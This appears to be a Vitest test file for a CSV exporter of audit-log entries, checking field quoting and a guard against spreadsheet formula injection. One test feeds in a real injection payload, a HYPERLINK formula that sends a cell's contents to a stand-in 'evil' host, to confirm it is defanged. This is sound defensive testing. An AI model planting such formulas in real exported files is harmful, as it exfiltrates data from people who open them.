import { describe, expect, it } from "vitest";
import { escapeField, rowsToCsv } from "./csv";
import type { AuditEntry } from "@/lib/db/schema";

function row(
  overrides: Partial<AuditEntry & { actorEmail: string | null }> = {},
): AuditEntry & { actorEmail: string | null } {
  return {
    id: "00000000-0000-0000-0000-000000000001",
    ts: new Date("2026-05-17T06:00:00.000Z"),
    actorType: "user",
    actorId: "user-uuid",
    actorEmail: "alice@example.com",
    action: "auth.login.success",
    resourceType: "user",
    resourceId: "user-uuid",
    ip: "10.0.0.1",
    userAgent: "Mozilla/5.0",
    requestId: "req-1",
    before: null,
    after: null,
    ...overrides,
  } as AuditEntry & { actorEmail: string | null };
}

describe("escapeField", () => {
  it("returns plain ASCII unchanged", () => {
    expect(escapeField("hello")).toBe("hello");
    expect(escapeField("user.id")).toBe("user.id");
  });

  it("returns empty string unchanged", () => {
    expect(escapeField("")).toBe("");
  });

  it("quotes fields containing commas", () => {
    expect(escapeField("a,b")).toBe('"a,b"');
  });

  it("quotes fields containing newlines", () => {
    expect(escapeField("line1\nline2")).toBe('"line1\nline2"');
    expect(escapeField("line1\r\nline2")).toBe('"line1\r\nline2"');
  });

  it("doubles up internal quotes", () => {
    expect(escapeField('he said "hi"')).toBe('"he said ""hi"""');
  });

  it("defangs formula-injection triggers with a leading quote", () => {
    // No CSV special chars, so the only transformation is the formula guard.
    expect(escapeField("=1+1")).toBe("'=1+1");
    expect(escapeField("+1")).toBe("'+1");
    expect(escapeField("-1")).toBe("'-1");
    expect(escapeField("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(escapeField("\tlead-tab")).toBe("'\tlead-tab");
  });

  it("defangs a formula that also needs RFC-4180 quoting", () => {
    // A real attack payload: leading '=' AND an embedded comma/quote.
    expect(escapeField('=HYPERLINK("http://evil/?"&A1)')).toBe(
      '"\'=HYPERLINK(""http://evil/?""&A1)"',
    );
  });

  it("does not prefix when the trigger is not the first character", () => {
    expect(escapeField("a=1")).toBe("a=1");
    expect(escapeField("user@example.com")).toBe("user@example.com");
  });
});

describe("rowsToCsv", () => {
  it("emits a header row even with zero entries", () => {
    const out = rowsToCsv([]);
    expect(out.split("\r\n")[0]).toBe(
      "ts,actor_type,actor_id,actor_email,action,resource_type,resource_id,ip,user_agent,request_id,before,after",
    );
  });

  it("emits a row per entry with CRLF terminators", () => {
    const out = rowsToCsv([row()]);
    const lines = out.split("\r\n");
    // header + 1 row + trailing empty (from final CRLF)
    expect(lines).toHaveLength(3);
    expect(lines[2]).toBe("");
    expect(lines[1]).toBe(
      "2026-05-17T06:00:00.000Z,user,user-uuid,alice@example.com,auth.login.success,user,user-uuid,10.0.0.1,Mozilla/5.0,req-1,,",
    );
  });

  it("serializes before/after as JSON strings", () => {
    const out = rowsToCsv([
      row({
        before: { email: "old@example.com" },
        after: { email: "new@example.com" },
      }),
    ]);
    // JSON contains quotes → CSV needs to escape them with doubling.
    expect(out).toContain('"{""email"":""old@example.com""}"');
    expect(out).toContain('"{""email"":""new@example.com""}"');
  });

  it("renders nullable columns as empty fields", () => {
    const out = rowsToCsv([
      row({
        actorId: null,
        actorEmail: null,
        resourceId: null,
        ip: null,
        userAgent: null,
        requestId: null,
      }),
    ]);
    const dataLine = out.split("\r\n")[1]!;
    // Six empties: actorId, actorEmail, resourceId, ip, userAgent, requestId
    expect(dataLine).toBe("2026-05-17T06:00:00.000Z,user,,,auth.login.success,user,,,,,,");
  });
});
